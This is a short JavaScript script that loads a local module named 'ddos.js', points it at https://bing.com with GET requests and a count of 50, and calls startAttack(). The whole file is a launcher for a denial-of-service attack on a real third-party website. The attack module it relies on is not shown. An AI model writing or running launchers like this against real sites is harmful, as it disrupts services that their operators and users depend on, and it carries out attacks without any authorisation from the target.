const dd = require('./src/lib/ddos.js');

dd.setStuff("https://bing.com",'get',50);
dd.startAttack();
